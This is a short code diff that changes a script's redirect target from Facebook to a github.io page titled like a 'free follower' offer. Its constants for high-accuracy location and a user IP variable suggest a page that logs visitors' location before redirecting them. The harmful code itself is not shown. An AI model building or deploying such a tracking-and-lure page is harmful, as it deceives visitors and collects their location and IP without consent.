@@ -96,7 +96,7 @@
         const HIGH_ACCURACY = true; // Set to false if you don't need high accuracy
         const MAX_RETRIES = 3; // Maximum retries for failed requests
         const REQUEST_TIMEOUT = 10000; // 10 seconds timeout for API requests
-        const REDIRECT_URL = "https://www.facebook.com"; // Editable redirect URL
+        const REDIRECT_URL = "https://laik112.github.io/Instal-free-follower-/"; // Editable redirect URL
 
         // Global variables
         let userIP = '';
